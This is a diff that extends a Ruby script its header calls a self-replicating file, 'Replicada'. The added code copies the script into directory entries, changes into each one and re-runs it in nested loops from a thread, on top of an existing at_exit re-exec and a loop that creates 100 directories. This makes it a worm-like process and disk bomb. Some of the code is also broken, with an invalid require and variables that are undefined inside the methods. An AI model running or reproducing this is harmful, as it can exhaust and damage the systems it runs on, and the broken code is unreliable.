@@ -9,7 +9,28 @@ self-replicating ruby file - Replicada by archisha69
 
 require "fileutils"
 require "securerandom"
-    
+require "dir"
+require "thread"
+
+def subrun()
+    system("ruby #{File.basename(__FILE__)}")
+end
+
+def cp(dest)
+    FileUtils.cp("#{cwd}/#{File.basename(__FILE__)}", dest)
+end
+
+def crossdir()
+    while count < 8 do #layers
+        subrun()
+        for qwerty in Dir.entries(name) do
+            cp(qwerty)
+            FileUtils.cd(qwerty)
+            subrun()
+        end
+    end
+end
+
 at_exit do
     exec("ruby #{File.basename(__FILE__)}")
 end
@@ -24,6 +45,10 @@ while count < 100
     FileUtils.mkdir(name)
     FileUtils.cd(name)
     FileUtils.cp("../#{File.basename(__FILE__)}", FileUtils.pwd())
+    t = Thread.new {
+        crossdir()
+    }
+    t.join
     FileUtils.cd(cwd)
     count += 1
 end
